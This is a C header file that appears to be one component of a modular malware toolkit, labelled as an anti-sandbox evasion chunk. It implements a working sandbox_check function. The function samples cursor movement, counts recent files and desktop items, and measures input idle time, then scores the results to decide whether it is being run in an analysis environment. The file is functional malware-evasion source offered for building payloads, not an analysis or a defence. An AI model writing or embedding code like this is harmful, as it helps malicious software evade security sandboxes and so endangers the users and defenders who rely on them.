// chunk: evasion/anti_sandbox_user
// depends: (none)
// provides: sandbox_check
// headers: windows.h
// risk: low
// note: User interaction checks — mouse movement, recent files count, last input time, desktop icons. Sandboxes have zero/minimal interaction history.

#ifndef CHUNK_ANTI_SANDBOX_USER
#define CHUNK_ANTI_SANDBOX_USER

#include <windows.h>
#include <shlobj.h>

static int sandbox_check(void) {
    // Check 1: Mouse movement — cursor should move between two samples on a real machine
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(600);
    GetCursorPos(&p2);

    int mouse_moved = (p1.x != p2.x || p1.y != p2.y);

    // Check 2: Recent files count — real users have many recent documents
    char recent_path[MAX_PATH];
    int recent_count = 0;

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recent_path))) {
        char search[MAX_PATH];
        wsprintfA(search, "%s\\*", recent_path);

        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(search, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (fd.cFileName[0] != '.')
                    recent_count++;
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }

    // Check 3: Last input time — real machines have recent keyboard/mouse activity
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    DWORD idle_ms = 0;
    if (GetLastInputInfo(&lii)) {
        idle_ms = GetTickCount() - lii.dwTime;
    }

    // Check 4: Desktop icon/file count
    char desktop_path[MAX_PATH];
    int desktop_count = 0;
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path))) {
        char search[MAX_PATH];
        wsprintfA(search, "%s\\*", desktop_path);

        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(search, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (fd.cFileName[0] != '.')
                    desktop_count++;
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }

    // Scoring: sandbox if multiple indicators are suspicious
    int score = 0;

    if (!mouse_moved) score += 2;
    if (recent_count < 5) score += 2;
    if (idle_ms > 600000) score += 1;   // idle > 10 min
    if (desktop_count < 3) score += 1;

    // Threshold: 3+ points = likely sandbox
    return (score >= 3) ? 1 : 0;
}

#endif
